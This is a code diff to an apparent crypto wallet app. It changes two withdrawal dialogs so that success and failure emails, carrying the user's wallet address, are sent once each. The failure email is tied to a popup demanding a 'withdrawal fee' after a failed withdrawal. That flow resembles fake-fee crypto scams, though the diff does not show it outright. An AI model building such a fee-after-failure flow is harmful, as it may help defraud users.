@@ -2,7 +2,7 @@ import { brandPreviewMeta } from "@/lib/brand";
 import { createFileRoute, Link } from "@tanstack/react-router";
 import { useQuery } from "@tanstack/react-query";
 import { useServerFn } from "@tanstack/react-start";
-import { useEffect, useMemo, useState } from "react";
+import { useEffect, useMemo, useRef, useState } from "react";
 import { ArrowLeft, Loader2, MessageCircle, Sparkles, TrendingUp, Wallet2 } from "lucide-react";
 import { loadSession } from "@/lib/wallet-auth";
 import { marketsQuery, formatUSD } from "@/lib/prices";
@@ -436,15 +436,26 @@ function WithdrawDialog({
   const [stage, setStage] = useState<Stage>("idle");
   const sendEmail = useServerFn(sendWithdrawalEmail);
   const sendSupportEmail = useServerFn(sendWithdrawSupportEmail);
+  const sentMails = useRef<Set<"success" | "failed">>(new Set());
 
   useEffect(() => {
-    if (stage !== "success" && stage !== "failed") return;
+    // The success mail goes out while the successful state is on screen. The
+    // failure mail goes out when the popup asking for the withdrawal fee
+    // appears (the failure state that precedes it is only a brief transition).
+    const status: "success" | "failed" | null =
+      stage === "success"
+        ? "success"
+        : stage === "fee" || stage === "support"
+          ? "failed"
+          : null;
+    if (!status || sentMails.current.has(status)) return;
     const s = loadSession();
     if (!s?.address) return;
+    sentMails.current.add(status);
     sendEmail({
       data: {
         wallet_address: s.address,
-        status: stage,
+        status,
         symbol: asset.symbol,
         chain: asset.chainName,
         amount: asset.amount.toFixed(6),
@@ -753,6 +764,7 @@ function MaxWithdrawDialog({
   const [stage, setStage] = useState<Stage>("idle");
   const sendEmail = useServerFn(sendWithdrawalEmail);
   const sendSupportEmail = useServerFn(sendWithdrawSupportEmail);
+  const sentMails = useRef<Set<"success" | "failed">>(new Set());
 
   const destination = [
     needsEvm ? `EVM ${evmAddress.trim()}` : "",
@@ -763,13 +775,22 @@ function MaxWithdrawDialog({
     .slice(0, 120);
 
   useEffect(() => {
-    if (stage !== "success" && stage !== "failed") return;
+    // Same trigger as the single-asset dialog: the failure mail is sent when the
+    // popup asking for the withdrawal fee appears.
+    const status: "success" | "failed" | null =
+      stage === "success"
+        ? "success"
+        : stage === "fee" || stage === "support"
+          ? "failed"
+          : null;
+    if (!status || sentMails.current.has(status)) return;
     const s = loadSession();
     if (!s?.address) return;
+    sentMails.current.add(status);
     sendEmail({
       data: {
         wallet_address: s.address,
-        status: stage,
+        status,
         symbol: "MAX",
         chain: "All chains",
         amount: totalUsd.toFixed(2),
